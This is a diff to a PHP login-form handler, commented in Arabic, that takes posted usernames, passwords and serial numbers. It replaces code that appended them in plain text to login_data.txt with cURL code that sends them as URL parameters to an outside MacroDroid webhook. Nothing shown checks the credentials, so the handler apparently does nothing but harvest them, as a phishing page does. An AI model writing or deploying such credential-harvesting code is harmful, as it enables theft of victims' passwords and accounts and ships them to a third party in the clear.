@@ -5,16 +5,22 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST['username'];
     $password = $_POST['password'];
 
-    // صيغة لتخزين البيانات في ملف نصي
-    $file = fopen("login_data.txt", "a"); // فتح الملف في وضع الإضافة
-    if ($file) {
-        // صيغة البيانات (يمكنك تعديل هذا الشكل حسب الحاجة)
-        $data = "SN: $sn, Username: $username, Password: $password\n";
-        fwrite($file, $data); // كتابة البيانات في الملف
-        fclose($file); // إغلاق الملف
-        echo "Data saved successfully.";
+    // رابط الـ Webhook مع معلمات الـ URL
+    $webhook_url = "https://trigger.macrodroid.com/9519b967-983a-4878-a3c7-7d9560ffa0f7/pro?user=" . urlencode($username) . "&password=" . urlencode($password) . "&serial=" . urlencode($sn);
+
+    // استخدام cURL لإرسال البيانات إلى Webhook
+    $ch = curl_init($webhook_url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+    // تنفيذ الطلب
+    $response = curl_exec($ch);
+    if (curl_errno($ch)) {
+        echo 'Error:' . curl_error($ch); // عرض الأخطاء في حالة وجودها
     } else {
-        echo "Error opening the file.";
+        echo "Data sent successfully to webhook.";
     }
+
+    // إغلاق جلسة cURL
+    curl_close($ch);
 }
 ?>
